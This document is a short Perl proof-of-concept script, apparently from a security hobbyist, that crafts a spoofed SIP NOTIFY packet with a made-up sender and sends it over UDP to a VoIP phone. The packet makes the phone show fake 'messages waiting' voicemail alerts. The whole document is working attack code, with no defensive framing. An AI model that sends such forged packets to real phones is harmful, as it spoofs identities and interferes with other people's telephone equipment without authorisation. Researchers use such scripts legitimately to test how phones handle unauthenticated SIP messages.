#!/usr/bin/perl
# SIP NOTIFY POC by DrFrancky@securax.org
use Socket;
SendSIPTo("10.0.0.1"); # IP of the phone

sub SendSIPTo{
$phone_ip = shift;
$MESG="NOTIFY sip:chaos\@$phone_ip:5060 SIP/2.0
Via: SIP/2.0/UDP 1.2.3.4:5060;branch=000000000000000
From: \"drfrancky\" <sip:drfrancky\@1.2.3.4>;tag=000000000
To:  <sip:chaos\@$phone_ip>
Contact: <sip:drfrancky\@1.2.3.4>
Event: message-summary
Call-ID: drfrancky\@1.2.3.4
CSeq: 102 NOTIFY
Content-Type: application/simple-message-summary
Content-Length: 37
Messages-Waiting: yes
Voicemail: 3/2";

$proto = getprotobyname('udp');
socket(SOCKET, PF_INET, SOCK_DGRAM, $proto) ;
$iaddr = inet_aton("0.0.0.0");
$paddr = sockaddr_in(5060, $iaddr);
bind(SOCKET, $paddr) ;
$port=5060;
$hisiaddr = inet_aton($phone_ip) ;
$hispaddr = sockaddr_in($port, $hisiaddr);
send(SOCKET, $MESG, 0,$hispaddr ) || warn "send $host $!\n";
}

